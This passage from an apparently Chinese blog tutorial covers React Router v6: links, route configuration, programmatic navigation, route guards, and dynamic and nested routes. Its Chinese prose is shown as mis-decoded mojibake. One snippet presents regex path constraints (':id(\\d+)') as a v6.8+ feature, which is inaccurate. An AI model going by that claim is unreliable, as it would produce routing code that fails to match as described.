class="hljs-name">NavLink</span>&gt;</span></span><br></code></pre></td></tr></table></figure><ul><li><code>&lt;Link&gt;</code>ï¼š<ul><li>å£°æ˜å¼å¯¼èˆªç»„ä»¶ï¼Œæ¸²æŸ“ä¸º <code>&lt;a&gt;</code> æ ‡ç­¾</li><li>to å±æ€§æ”¯æŒå­—ç¬¦ä¸²&#x2F;å¯¹è±¡ï¼ˆå¯åŒ…å« pathname, search, hash, stateï¼‰</li></ul></li><li><code>&lt;NavLink&gt;</code>ï¼š<ul><li>å¢å¼ºç‰ˆ <code>&lt;Link&gt;</code>ï¼Œå¯æ·»åŠ æ´»åŠ¨çŠ¶æ€æ ·å¼</li><li>isActive æ ‡å¿—å½“å‰æ˜¯å¦åŒ¹é…</li><li>end å±æ€§ç¡®ä¿ç²¾ç¡®åŒ¹é…ï¼ˆé¿å…çˆ¶è·¯ç”±æ¿€æ´»æ—¶å­è·¯ç”±ä¹Ÿè¢«æ¿€æ´»ï¼‰</li></ul></li></ul><h3 id="åŸºç¡€è·¯ç”±é…ç½®æ¨¡å¼"><a href="#åŸºç¡€è·¯ç”±é…ç½®æ¨¡å¼" class="headerlink" title="åŸºç¡€è·¯ç”±é…ç½®æ¨¡å¼"></a>åŸºç¡€è·¯ç”±é…ç½®æ¨¡å¼</h3><p><strong>é›†ä¸­å¼é…ç½®ï¼ˆæ¨èï¼‰</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// routes.js</span><br><span class="hljs-keyword">const</span> routes = [<br>  &#123; <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/&#x27;</span>, <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Home</span> /&gt;</span></span> &#125;,<br>  &#123; <br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;/products&#x27;</span>,<br>    <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProductLayout</span> /&gt;</span></span>,<br>    <span class="hljs-attr">children</span>: [<br>      &#123; <span class="hljs-attr">index</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProductList</span> /&gt;</span></span> &#125;,<br>      &#123; <span class="hljs-attr">path</span>: <span class="hljs-string">&#x27;:id&#x27;</span>, <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProductDetail</span> /&gt;</span></span> &#125;<br>    ]<br>  &#125;<br>];<br><br><span class="hljs-comment">// App.js</span><br><span class="hljs-keyword">import</span> &#123; useRoutes &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">App</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-title function_">useRoutes</span>(routes);<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>ç¼–ç¨‹å¼å¯¼èˆª</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; useNavigate &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">LoginButton</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> navigate = <span class="hljs-title function_">useNavigate</span>();<br>  <br>  <span class="hljs-keyword">const</span> <span class="hljs-title function_">handleLogin</span> = (<span class="hljs-params"></span>) =&gt; &#123;<br>    <span class="hljs-title function_">login</span>().<span class="hljs-title function_">then</span>(<span class="hljs-function">() =&gt;</span> &#123;<br>      <span class="hljs-comment">// è·³è½¬å¹¶æ›¿æ¢å†å²è®°å½•ï¼ˆä¸å¯å›é€€ï¼‰</span><br>      <span class="hljs-title function_">navigate</span>(<span class="hljs-string">&#x27;/dashboard&#x27;</span>, &#123; <span class="hljs-attr">replace</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">state</span>: &#123; user &#125; &#125;);<br>    &#125;);<br>  &#125;;<br><br>  <span class="hljs-keyword">return</span> <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">button</span> <span class="hljs-attr">onClick</span>=<span class="hljs-string">&#123;handleLogin&#125;</span>&gt;</span>ç™»å½•<span class="hljs-tag">&lt;/<span class="hljs-name">button</span>&gt;</span></span>;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li>useNavigate() è¿”å›å¯¼èˆªå‡½æ•°</li><li>å‚æ•°é€‰é¡¹ï¼š<ul><li>replace: true æ›¿æ¢å½“å‰å†å²è®°å½•</li><li>state ä¼ é€’è·¯ç”±çŠ¶æ€ï¼ˆå¯é€šè¿‡ useLocation() è·å–ï¼‰</li></ul></li></ul><h3 id="é¢è¯•é«˜é¢‘é—®é¢˜ä¸è¸©å‘ç‚¹"><a href="#é¢è¯•é«˜é¢‘é—®é¢˜ä¸è¸©å‘ç‚¹" class="headerlink" title="é¢è¯•é«˜é¢‘é—®é¢˜ä¸è¸©å‘ç‚¹"></a>é¢è¯•é«˜é¢‘é—®é¢˜ä¸è¸©å‘ç‚¹</h3><p><strong>BrowserRouter çš„æœåŠ¡å™¨é…ç½®é—®é¢˜</strong></p><p>é—®é¢˜ï¼šç›´æ¥è®¿é—® &#x2F;dashboard è·¯ç”±å‡ºç° 404</p><p>è§£å†³æ–¹æ¡ˆï¼š</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-comment"># Nginx é…ç½®</span><br><span class="hljs-section">location</span> / &#123;<br>  <span class="hljs-attribute">try_files</span> <span class="hljs-variable">$uri</span> <span class="hljs-variable">$uri</span>/ /index.html;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>v5 åˆ° v6 çš„é‡å¤§å˜åŒ–</strong></p><ul><li>åºŸé™¤ <code>&lt;Switch&gt;</code> â†’ æ”¹ç”¨ <code>&lt;Routes&gt;</code></li><li>åºŸé™¤ component&#x3D;{Component} â†’ æ”¹ç”¨ <code>element=&#123;&lt;Component /&gt;&#125;</code></li><li>åºŸé™¤ exact å±æ€§ â†’ è·¯å¾„åŒ¹é…è§„åˆ™å˜æ›´ï¼ˆé»˜è®¤éƒ¨åˆ†åŒ¹é…ï¼‰</li><li>åµŒå¥—è·¯ç”±å¿…é¡»ä½¿ç”¨ <code>&lt;Outlet&gt;</code> ä½œä¸ºå ä½ç¬¦</li></ul><p><strong>åŠ¨æ€è·¯ç”±å‚æ•°è·å–</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">import</span> &#123; useParams &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">UserDetail</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; id &#125; = <span class="hljs-title function_">useParams</span>();  <span class="hljs-comment">// è·å– :id å‚æ•°</span><br>  <span class="hljs-comment">// ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>è·¯ç”±çŠ¶æ€ä¼ é€’ä¸è·å–</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å‘é€æ–¹</span><br>&lt;<span class="hljs-title class_">Link</span> to=<span class="hljs-string">&quot;/profile&quot;</span> state=&#123;&#123; <span class="hljs-attr">fromHome</span>: <span class="hljs-literal">true</span> &#125;&#125; /&gt;<br><br><span class="hljs-comment">// æ¥æ”¶æ–¹</span><br><span class="hljs-keyword">import</span> &#123; useLocation &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">Profile</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> location = <span class="hljs-title function_">useLocation</span>();<br>  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(location.<span class="hljs-property">state</span>?.<span class="hljs-property">fromHome</span>); <span class="hljs-comment">// true</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong><code>&lt;NavLink&gt;</code> ç²¾ç¡®åŒ¹é…é—®é¢˜</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é”™è¯¯ï¼š/dashboard/settings ä¼šåŒæ—¶æ¿€æ´»ä¸¤ä¸ªé“¾æ¥</span><br>&lt;<span class="hljs-title class_">NavLink</span> to=<span class="hljs-string">&quot;/dashboard&quot;</span>&gt;æ§åˆ¶å°&lt;/<span class="hljs-title class_">NavLink</span>&gt;<br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">NavLink</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/dashboard/settings&quot;</span>&gt;</span>è®¾ç½®<span class="hljs-tag">&lt;/<span class="hljs-name">NavLink</span>&gt;</span></span><br><br><span class="hljs-comment">// æ­£ç¡®ï¼šçˆ¶é“¾æ¥æ·»åŠ  end å±æ€§</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">NavLink</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/dashboard&quot;</span> <span class="hljs-attr">end</span>&gt;</span>æ§åˆ¶å°<span class="hljs-tag">&lt;/<span class="hljs-name">NavLink</span>&gt;</span></span><br></code></pre></td></tr></table></figure><p><strong>è·¯ç”±é‰´æƒåŸºç¡€æ¨¡å¼</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// é«˜é˜¶ç»„ä»¶ç¤ºä¾‹</span><br><span class="hljs-keyword">const</span> <span class="hljs-title function_">PrivateRoute</span> = (<span class="hljs-params">&#123; children &#125;</span>) =&gt; &#123;<br>  <span class="hljs-keyword">const</span> &#123; user &#125; = <span class="hljs-title function_">useAuth</span>();<br>  <span class="hljs-keyword">return</span> user ? children : <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Navigate</span> <span class="hljs-attr">to</span>=<span class="hljs-string">&quot;/login&quot;</span> /&gt;</span></span>;<br>&#125;;<br><br><span class="hljs-comment">// ä½¿ç”¨</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/admin&quot;</span></span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span></span></span><br><span class="hljs-tag"><span class="language-xml">    &lt;<span class="hljs-attr">PrivateRoute</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">AdminPanel</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">PrivateRoute</span>&gt;</span></span><br><span class="language-xml">  &#125;</span><br><span class="language-xml">/&gt;</span><br></code></pre></td></tr></table></figure><h3 id="æ ¸å¿ƒæ€»ç»“"><a href="#æ ¸å¿ƒæ€»ç»“" class="headerlink" title="æ ¸å¿ƒæ€»ç»“"></a>æ ¸å¿ƒæ€»ç»“</h3><ul><li>è·¯ç”±ä¸‰ä»¶å¥—ï¼š<ul><li><code>&lt;BrowserRouter&gt;</code> æä¾›è·¯ç”±ä¸Šä¸‹æ–‡</li><li><code>&lt;Routes&gt;</code> + <code>&lt;Route&gt;</code> å®šä¹‰è·¯ç”±è§„åˆ™</li><li><code>&lt;Link&gt;</code>&#x2F;<code>&lt;NavLink&gt;</code> å®ç°å£°æ˜å¼å¯¼èˆª</li></ul></li><li>v6 æ ¸å¿ƒå˜åŒ–ï¼š<ul><li>è·¯ç”±é…ç½®ä» component æ”¹ä¸º element</li><li>åµŒå¥—è·¯ç”±ä½¿ç”¨ <code>&lt;Outlet&gt;</code> ä½œä¸ºæ¸²æŸ“å‡ºå£</li><li>åŒ¹é…è§„åˆ™ä¼˜åŒ–ï¼ˆè‡ªåŠ¨é€‰æ‹©æœ€ä½³åŒ¹é…ï¼‰</li></ul></li><li>é¢è¯•å¿…è€ƒï¼š<ul><li>åŠ¨æ€è·¯ç”±å‚æ•°è·å–ï¼ˆuseParamsï¼‰</li><li>ç¼–ç¨‹å¼å¯¼èˆªï¼ˆuseNavigateï¼‰</li><li>è·¯ç”±å®ˆå«å®ç°æ–¹æ¡ˆ</li><li>v5 åˆ° v6 çš„è¿ç§»é—®é¢˜</li></ul></li></ul><h2 id="6-2-åŠ¨æ€è·¯ç”±ä¸åµŒå¥—è·¯ç”±"><a href="#6-2-åŠ¨æ€è·¯ç”±ä¸åµŒå¥—è·¯ç”±" class="headerlink" title="6.2 åŠ¨æ€è·¯ç”±ä¸åµŒå¥—è·¯ç”±"></a>6.2 åŠ¨æ€è·¯ç”±ä¸åµŒå¥—è·¯ç”±</h2><h3 id="æ ¸å¿ƒæ¦‚å¿µ"><a href="#æ ¸å¿ƒæ¦‚å¿µ" class="headerlink" title="æ ¸å¿ƒæ¦‚å¿µ"></a>æ ¸å¿ƒæ¦‚å¿µ</h3><p><strong>åŠ¨æ€è·¯ç”±</strong></p><ul><li>å®šä¹‰ï¼šè·¯å¾„ä¸­åŒ…å«å‚æ•°çš„è·¯ç”±ï¼ˆå¦‚ &#x2F;users&#x2F;:idï¼‰</li><li>æ ¸å¿ƒä»·å€¼ï¼š<ul><li>åˆ›å»ºå¯å¤ç”¨çš„è§†å›¾æ¨¡æ¿</li><li>æ ¹æ®URLå‚æ•°åŠ¨æ€åŠ è½½æ•°æ®</li><li>å®ç°SEOå‹å¥½çš„URLç»“æ„</li></ul></li></ul><p><strong>åµŒå¥—è·¯ç”±</strong></p><ul><li>å®šä¹‰ï¼šè·¯ç”±ä¹‹é—´çš„çˆ¶å­å±‚çº§å…³ç³»</li><li>æ ¸å¿ƒä»·å€¼ï¼š<ul><li>å®ç°å¸ƒå±€å¤ç”¨ï¼ˆå…±äº«header&#x2F;sidebarï¼‰</li><li>ç»„ç»‡å¤æ‚çš„åº”ç”¨ç»“æ„</li><li>ä¿æŒå±€éƒ¨UIçŠ¶æ€ï¼ˆä»…æ›´æ–°å­è·¯ç”±åŒºåŸŸï¼‰</li></ul></li></ul><h3 id="åŠ¨æ€è·¯ç”±æ·±åº¦è§£æ"><a href="#åŠ¨æ€è·¯ç”±æ·±åº¦è§£æ" class="headerlink" title="åŠ¨æ€è·¯ç”±æ·±åº¦è§£æ"></a>åŠ¨æ€è·¯ç”±æ·±åº¦è§£æ</h3><p><strong>åŸºç¡€å®ç°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// è·¯ç”±é…ç½®</span><br>&lt;<span class="hljs-title class_">Routes</span>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/products/:productId&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">ProductDetail</span> /&gt;</span>&#125; /&gt;</span><br>&lt;/<span class="hljs-title class_">Routes</span>&gt;<br><br><span class="hljs-comment">// ç»„ä»¶å†…è·å–å‚æ•°</span><br><span class="hljs-keyword">import</span> &#123; useParams &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">ProductDetail</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">const</span> &#123; productId &#125; = <span class="hljs-title function_">useParams</span>(); <span class="hljs-comment">// è·å–åŠ¨æ€å‚æ•°</span><br>  <span class="hljs-comment">// ä½¿ç”¨ productId åŠ è½½æ•°æ®...</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong>é«˜çº§åŒ¹é…æ¨¡å¼</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// å¤šå‚æ•°è·¯ç”±</span><br>&lt;<span class="hljs-title class_">Route</span> path=<span class="hljs-string">&quot;/category/:categoryId/product/:productId&quot;</span> /&gt;<br><br><span class="hljs-comment">// å¯é€‰å‚æ•°</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/search/:keyword?/:filter?&quot;</span> /&gt;</span></span><br><br><span class="hljs-comment">// æ­£åˆ™çº¦æŸ (v6.8+)</span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> </span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/user/:id(\\d+)&quot;</span> // <span class="hljs-attr">åªåŒ¹é…æ•°å­—ID</span></span></span><br><span class="hljs-tag"><span class="language-xml">  <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">UserProfile</span> /&gt;</span>&#125; </span><br><span class="language-xml">/&gt;</span><br></code></pre></td></tr></table></figure><p><strong>æ•°æ®åŠ è½½æ¨¡å¼</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// React Router v6.4+ æ•°æ®è·¯ç”±</span><br><span class="hljs-keyword">const</span> router = <span class="hljs-title function_">createBrowserRouter</span>([<br>  &#123;<br>    <span class="hljs-attr">path</span>: <span class="hljs-string">&quot;products/:id&quot;</span>,<br>    <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProductLayout</span> /&gt;</span></span>,<br>    <span class="hljs-attr">loader</span>: <span class="hljs-title function_">async</span> (&#123; params &#125;) =&gt; &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/api/products/<span class="hljs-subst">$&#123;params.id&#125;</span>`</span>); <span class="hljs-comment">// é¢„åŠ è½½æ•°æ®</span><br>    &#125;,<br>    <span class="hljs-attr">children</span>: [<br>      &#123; <span class="hljs-attr">index</span>: <span class="hljs-literal">true</span>, <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProductOverview</span> /&gt;</span></span> &#125;,<br>      &#123; <span class="hljs-attr">path</span>: <span class="hljs-string">&quot;reviews&quot;</span>, <span class="hljs-attr">element</span>: <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">ProductReviews</span> /&gt;</span></span> &#125;<br>    ]<br>  &#125;<br>]);<br></code></pre></td></tr></table></figure><h3 id="åµŒå¥—è·¯ç”±æ·±åº¦è§£æ"><a href="#åµŒå¥—è·¯ç”±æ·±åº¦è§£æ" class="headerlink" title="åµŒå¥—è·¯ç”±æ·±åº¦è§£æ"></a>åµŒå¥—è·¯ç”±æ·±åº¦è§£æ</h3><p><strong>åŸºç¡€åµŒå¥—ç»“æ„</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;<span class="hljs-title class_">Routes</span>&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;dashboard&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">DashboardLayout</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">index</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">DashboardHome</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;analytics&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">AnalyticsPage</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;settings&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">SettingsPage</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span></span><br>&lt;/<span class="hljs-title class_">Routes</span>&gt;<br><br><span class="hljs-comment">// DashboardLayout.jsx</span><br><span class="hljs-keyword">import</span> &#123; <span class="hljs-title class_">Outlet</span> &#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;react-router-dom&#x27;</span>;<br><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">DashboardLayout</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;dashboard&quot;</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Sidebar</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;content&quot;</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Outlet</span> /&gt;</span> &#123;/* å­è·¯ç”±æ¸²æŸ“ä½ç½® */&#125;</span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span></span><br>  );<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>å¤šçº§åµŒå¥—å®ç°</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript">&lt;<span class="hljs-title class_">Route</span> path=<span class="hljs-string">&quot;admin&quot;</span> element=&#123;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">AdminLayout</span> /&gt;</span></span>&#125;&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">index</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">AdminDashboard</span> /&gt;</span>&#125; /&gt;</span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;users&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">UserManagementLayout</span> /&gt;</span>&#125;&gt;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">index</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">UserList</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">    <span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;:userId&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">UserDetail</span> /&gt;</span>&#125; /&gt;</span><br><span class="language-xml">  <span class="hljs-tag">&lt;/<span class="hljs-name">Route</span>&gt;</span></span><br>&lt;/<span class="hljs-title class_">Route</span>&gt;<br></code></pre></td></tr></table></figure><p><strong>å¸ƒå±€è·¯ç”±æ¨¡å¼</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// åˆ›å»ºå…±äº«å¸ƒå±€ç»„ä»¶</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">MainLayout</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> (<br>    <span class="language-xml"><span class="hljs-tag">&lt;&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Header</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">main</span>&gt;</span></span><br><span class="language-xml">        <span class="hljs-tag">&lt;<span class="hljs-name">Outlet</span> /&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;/<span class="hljs-name">main</span>&gt;</span></span><br><span class="language-xml">      <span class="hljs-tag">&lt;<span class="hljs-name">Footer</span> /&gt;</span></span><br><span class="language-xml">    <span class="hljs-tag">&lt;/&gt;</span></span><br>  );<br>&#125;<br><br><span class="hljs-comment">// åº”ç”¨å¸ƒå±€</span><br>&lt;<span class="hljs-title class_">Route</span> element=&#123;<span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">MainLayout</span> /&gt;</span></span>&#125;&gt;<br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">HomePage</span> /&gt;</span>&#125; /&gt;</span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/about&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">AboutPage</span> /&gt;</span>&#125; /&gt;</span><br>  <span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">Route</span> <span class="hljs-attr">path</span>=<span class="hljs-string">&quot;/contact&quot;</span> <span class="hljs-attr">element</span>=<span class="hljs-string">&#123;</span>&lt;<span class="hljs-attr">ContactPage</span> /&gt;</span>&#125; /&gt;</span><br>&lt;/<span class="hljs-title 